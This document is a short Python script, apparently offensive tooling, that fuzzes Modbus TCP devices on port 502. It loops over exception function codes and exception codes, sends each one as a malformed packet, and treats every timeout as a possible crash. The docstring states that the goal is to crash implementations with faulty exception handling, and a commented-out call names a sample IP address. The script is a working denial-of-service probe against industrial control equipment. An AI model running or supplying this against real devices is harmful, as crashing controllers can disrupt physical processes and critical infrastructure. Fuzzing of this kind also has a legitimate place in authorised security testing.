def modbus_exception_fuzzer(target_ip):
    """
    Trigger Modbus exception handling bugs
    Some implementations crash on invalid exception codes
    """
    import socket
    import struct

    for fc in range(0x81, 0xFF):  # Exception function codes
        for exception_code in range(0x01, 0xFF):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)

            try:
                sock.connect((target_ip, 502))

                # Build Modbus exception response
                trans_id = b'\x00\x01'
                proto_id = b'\x00\x00'
                length = b'\x00\x03'
                unit_id = b'\x01'
                func_code = bytes([fc])
                exception = bytes([exception_code])

                packet = trans_id + proto_id + length + unit_id + func_code + exception
                sock.send(packet)

                response = sock.recv(1024)
                print(f"[*] FC: 0x{fc:02X}, Exception: 0x{exception_code:02X} - Response: {len(response)} bytes")

            except socket.timeout:
                print(f"[!] FC: 0x{fc:02X}, Exception: 0x{exception_code:02X} - TIMEOUT (possible crash)")
            except:
                pass
            finally:
                sock.close()

# modbus_exception_fuzzer('192.168.1.100')
